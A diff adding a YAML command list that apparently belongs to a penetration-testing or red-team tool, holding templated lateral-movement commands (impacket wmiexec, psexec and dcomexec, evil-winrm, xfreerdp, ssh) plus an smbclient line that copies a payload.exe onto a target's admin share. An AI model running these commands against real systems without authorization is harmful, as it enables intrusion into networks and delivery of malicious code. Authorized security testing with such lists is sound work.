@@ -1,0 +1,16 @@
+commands:
+  lateral_movement:
+    - description: "WMI lateral movement"
+      command: "impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}"
+    - description: "PsExec lateral movement"
+      command: "impacket-psexec {DOMAIN}/{USER}:{PASS}@{IP}"
+    - description: "Evil-WinRM lateral movement"
+      command: "evil-winrm -i {IP} -u '{USER}' -p '{PASS}'"
+    - description: "RDP lateral movement"
+      command: "xfreerdp /v:{IP} /u:{DOMAIN}\\{USER} /p:'{PASS}' /cert:ignore"
+    - description: "SSH lateral movement"
+      command: "ssh {USER}@{IP}"
+    - description: "DCOM lateral movement"
+      command: "impacket-dcomexec {DOMAIN}/{USER}:{PASS}@{IP}"
+    - description: "SMB file copy for payload delivery"
+      command: "smbclient //{IP}/C$ -U '{DOMAIN}/{USER}%{PASS}' -c 'put payload.exe Windows\\Temp\\payload.exe'"
